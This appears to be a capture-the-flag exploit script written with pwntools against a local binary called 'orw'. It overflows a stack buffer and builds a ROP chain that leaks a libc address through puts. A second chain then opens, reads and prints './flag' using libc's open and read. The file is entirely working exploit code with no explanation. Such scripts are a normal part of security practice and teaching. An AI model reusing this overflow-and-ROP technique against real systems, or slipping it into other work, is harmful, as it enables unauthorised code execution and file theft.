from pwn import *
context(os='linux', arch='amd64', log_level='debug')


p = process("./orw")
libc = ELF("./libc-2.27.so")

p.recvuntil(":)")

payload = b"a"*0x20 + p64(0x601010 + 0x200) +  p64(0x0000000000400863) + p64(0x600FC8) + p64(0x400550)
payload += p64(0x0000000000400863) + p64(0) + p64(0x0000000000400861) + p64(0x601010 + 0x200) + p64(0) + p64(0x400570)
payload += p64(0x4007FB) + p64(0x601010 + 0x200)
p.send(payload)
libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00")) - libc.sym["puts"]
print(hex(libc.address))
sleep(1)
gdb.attach(p)
payload2 = b"./flag\x00\x00" + p64(0x0000000000400863) + p64(0x601010 + 0x200) + p64(0x0000000000400861) + p64(0)*2 + p64(libc.sym["open"])
payload2 += p64(0x0000000000400863) + p64(3) + p64(0x0000000000400861) + p64(0x601010 + 0x300) + p64(0) + p64(libc.address + 0x0000000000130514) + p64(0x80) + p64(0) +  p64(0x400570)
payload2 += p64(0x0000000000400863) + p64(0x601010 + 0x300) + p64(0x400550)
p.send(payload2)


p.interactive()